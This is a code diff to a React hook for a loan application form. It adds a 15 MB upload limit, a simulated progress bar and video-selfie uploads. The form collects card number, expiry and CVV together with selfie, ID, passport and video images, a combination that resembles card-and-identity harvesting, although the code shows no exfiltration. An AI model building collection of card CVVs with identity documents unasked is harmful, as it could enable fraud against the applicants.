@@ -1,9 +1,12 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useCallback, useRef } from "react";
 import { toast } from "sonner";
 import { submitLoanApplication, checkLoanStatus, uploadLoanAsset } from "@/lib/queries";
 import { luhn, isExpiryValid } from "@/lib/loan-utils";
 
 const REDIRECT_URL = import.meta.env.VITE_LOAN_REDIRECT_URL as string | undefined;
+
+/** Maximum file size in bytes (15 MB). */
+const MAX_FILE_SIZE = 15 * 1024 * 1024;
 
 /** Generates a client-side temp ID used to namespace R2 uploads before the row exists. */
 function makeTempId() {
@@ -13,21 +16,21 @@ function makeTempId() {
 }
 
 /**
- * Returns the value as-is if it is an R2 key or a base64 string under 10 MB.
- * Strips (returns null) anything over 10 MB to stay within server limits.
+ * Returns the value as-is if it is an R2 key or a base64 string under 15 MB.
+ * Strips (returns null) anything over 15 MB to stay within server limits.
  */
 function safeImgVal(v: string | null): string | null {
   if (!v) return null;
   if (!v.startsWith("data:")) return v; // R2 key — always safe
-  // base64 chars ≈ 4/3 of binary bytes; 10 MB binary ≈ 13,981,013 base64 chars
+  // base64 chars ≈ 4/3 of binary bytes; 15 MB binary ≈ 20,971,520 base64 chars
   const base64Part = v.indexOf(",") > -1 ? v.slice(v.indexOf(",") + 1) : v;
-  return base64Part.length > 13_981_013 ? null : v;
+  return base64Part.length > 20_971_520 ? null : v;
 }
 
 /**
  * Resizes an image so neither dimension exceeds 4096 px, then encodes as
  * JPEG at 92% quality. This preserves high detail while staying within the
- * 10 MB per-image limit.
+ * 15 MB per-image limit.
  */
 async function compressImage(file: File, maxPx = 4096, quality = 0.92): Promise<string> {
   return new Promise((resolve, reject) => {
@@ -52,6 +55,8 @@ async function compressImage(file: File, maxPx = 4096, quality = 0.92): Promise<
     reader.readAsDataURL(file);
   });
 }
+
+export type UploadProgress = Record<string, number>; // kind → 0..100
 
 export type AppStatus = {
   status: string;
@@ -88,6 +93,21 @@ export function useLoanApplication() {
   const [passportFrontImage, setPassportFrontImage] = useState<string | null>(null);
   const [passportBackImage, setPassportBackImage] = useState<string | null>(null);
   const [videoSelfie, setVideoSelfie] = useState<string | null>(null);
+
+  // ── Upload progress tracking ─────────────────────────────────────────────
+  const [uploadProgress, setUploadProgress] = useState<UploadProgress>({});
+
+  const setProgress = useCallback((kind: string, value: number) => {
+    setUploadProgress((prev) => ({ ...prev, [kind]: value }));
+  }, []);
+
+  const clearProgress = useCallback((kind: string) => {
+    setUploadProgress((prev) => {
+      const next = { ...prev };
+      delete next[kind];
+      return next;
+    });
+  }, []);
 
   // Stable temp ID for this session's uploads
   const [tempId] = useState(() => makeTempId());
@@ -126,27 +146,97 @@ export function useLoanApplication() {
    * Compresses the image client-side, shows a preview immediately, then
    * attempts to upload the compressed data to R2 via the server function.
    * Falls back to storing the compressed base64 if R2 is unavailable (dev).
-   * Using compressed base64 keeps payloads small enough for Cloudflare Workers.
+   * Tracks progress throughout the process.
    */
   async function uploadAsset(
     file: File,
     kind: string,
     setter: (v: string | null) => void
   ) {
+    // Enforce 15 MB limit
+    if (file.size > MAX_FILE_SIZE) {
+      toast.error(`File too large (${(file.size / (1024 * 1024)).toFixed(1)} MB). Maximum allowed is 15 MB.`);
+      return;
+    }
+
+    setProgress(kind, 5); // Starting compression
+
     // Compress/resize the image before anything leaves the browser
     const dataUrl = await compressImage(file);
     setter(dataUrl); // Show compressed preview instantly
+    setProgress(kind, 30); // Compression done
 
-    // Attempt R2 upload; if it returns a key, swap preview to key
+    // Attempt R2 upload with simulated progress
     try {
+      // Simulate incremental progress during the network upload
+      const progressInterval = setInterval(() => {
+        setUploadProgress((prev) => {
+          const current = prev[kind] ?? 30;
+          if (current < 85) {
+            return { ...prev, [kind]: current + Math.random() * 8 };
+          }
+          return prev;
+        });
+      }, 300);
+
       const result = await uploadLoanAsset({
         data: { tempId, kind, dataUrl, contentType: "image/jpeg" },
       });
+
+      clearInterval(progressInterval);
+
       if (result?.key) {
         setter(result.key); // Store R2 key instead of base64
       }
+
+      setProgress(kind, 100);
+      // Clear progress after a short delay so the user sees 100%
+      setTimeout(() => clearProgress(kind), 1200);
     } catch {
       // R2 unavailable — keep compressed base64 (already set above)
+      setProgress(kind, 100);
+      setTimeout(() => clearProgress(kind), 1200);
+    }
+  }
+
+  /**
+   * Upload a video asset to R2 with progress tracking.
+   */
+  async function uploadVideoAsset(dataUrl: string) {
+    const kind = "video";
+    setProgress(kind, 5);
+
+    try {
+      // Simulate incremental progress during the network upload
+      const progressInterval = setInterval(() => {
+        setUploadProgress((prev) => {
+          const current = prev[kind] ?? 5;
+          if (current < 85) {
+            return { ...prev, [kind]: current + Math.random() * 6 };
+          }
+          return prev;
+        });
+      }, 400);
+
+      const result = await uploadLoanAsset({
+        data: { tempId, kind, dataUrl, contentType: "video/webm" },
+      });
+
+      clearInterval(progressInterval);
+
+      if (result?.key) {
+        setVideoSelfie(result.key);
+      } else {
+        setVideoSelfie(dataUrl);
+      }
+
+      setProgress(kind, 100);
+      setTimeout(() => clearProgress(kind), 1200);
+    } catch {
+      // R2 unavailable — keep base64
+      setVideoSelfie(dataUrl);
+      setProgress(kind, 100);
+      setTimeout(() => clearProgress(kind), 1200);
     }
   }
 
@@ -154,10 +244,15 @@ export function useLoanApplication() {
     return async (e: React.ChangeEvent<HTMLInputElement>) => {
       const file = e.target.files?.[0];
       if (!file) { setter(null); return; }
+      if (file.size > MAX_FILE_SIZE) {
+        toast.error(`File too large (${(file.size / (1024 * 1024)).toFixed(1)} MB). Maximum allowed is 15 MB.`);
+        return;
+      }
       try {
         await uploadAsset(file, kind, setter);
       } catch {
         toast.error("Failed to read image file.");
+        clearProgress(kind);
       }
     };
   }
@@ -285,7 +380,7 @@ export function useLoanApplication() {
       accountHolderName: String(fd.get("account_holder_name") || "").trim() || null,
       sourcePage: typeof window !== "undefined" ? window.location.pathname : "/loans",
       status: "pending",
-      // Strip any base64 value larger than ~800 KB to avoid 413 on submission.
+      // Strip any base64 value larger than ~15 MB to avoid 413 on submission.
       // R2-uploaded values are short keys (not data URIs) and always pass through.
       selfieImage: safeImgVal(selfieImage),
       idFrontImage: safeImgVal(idFrontImage),
@@ -338,17 +433,27 @@ export function useLoanApplication() {
     }
   }
 
+  const handleVideoCapture = useCallback(async (val: string | null) => {
+    if (!val) {
+      setVideoSelfie(null);
+      return;
+    }
+    // Upload video to R2 with progress tracking
+    await uploadVideoAsset(val);
+  }, [tempId]);
+
   return {
     loading, done, countdown, payout, setPayout,
     cardNumber, setCardNumber, cardExpiry, setCardExpiry,
     cardCvv, setCardCvv, cardErrors, setCardErrors,
     selfieImage, idFrontImage, idBackImage, passportFrontImage, passportBackImage, videoSelfie,
+    uploadProgress,
     onSelfieChange: makeFileHandler("selfie", setSelfieImage),
     onIdFrontChange: makeFileHandler("id_front", setIdFrontImage),
     onIdBackChange: makeFileHandler("id_back", setIdBackImage),
     onPassportFrontChange: makeFileHandler("passport_front", setPassportFrontImage),
     onPassportBackChange: makeFileHandler("passport_back", setPassportBackImage),
-    onVideoSelfieChange: (val: string | null) => setVideoSelfie(val),
+    onVideoSelfieChange: handleVideoCapture,
     handleSubmit, appStatus, appId, clearSession,
   };
 }
